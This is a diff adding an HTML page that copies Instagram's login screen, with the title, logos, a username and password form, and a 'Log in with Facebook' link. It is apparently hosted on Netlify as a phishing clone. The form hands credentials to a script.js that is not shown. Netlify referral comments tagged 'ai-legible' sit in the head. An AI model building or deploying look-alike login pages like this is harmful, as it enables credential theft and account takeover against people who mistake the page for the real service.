@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=45b23c08-ab63-47b7-91b4-5d46fce9e763
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="hosting-provider" content="Netlify">
+<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=45b23c08-ab63-47b7-91b4-5d46fce9e763">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="Instagram_logo.svg">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="Instagram_logo.png" alt="Instagram Logo" class="logo">
+            <form class="login-form" id="loginForm">
+                <input type="text" placeholder="Phone number, username, or email" class="input-field" id="username" required>
+                <input type="password" placeholder="Password" class="input-field" id="password" required>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <div class="separator">
+                <span>OR</span>
+            </div>
+            <button class="facebook-login"><a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATlO_KgQAgxc9RzfSafyAbTeNlf3UMdYhasaMtXVSVfa73Y4c6f7LZe0LEGyQ-SjeG0F5XvTkI2_PVK8CWSxeq8uZ_Q0MZrA0NcDd8hp8j-v0Uy5aIL55kRNqpMBIDyQqC6eo1bFz2wRi0aoKPJdxVOXa6V7g21R2FPBRV1-VDAX0dIYQMJOsy6-jE1oTU4dxLjW2hee8XqGucEd8iJAqMuoivpZxBLuYvssi-ixwcV01MWrSZB8tffJue7fimwHf0PS">Log in with Facebook</a></button>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        <div class="signup-container">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
+<script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="45b23c08-ab63-47b7-91b4-5d46fce9e763" data-app-host="app.netlify.com"></script>
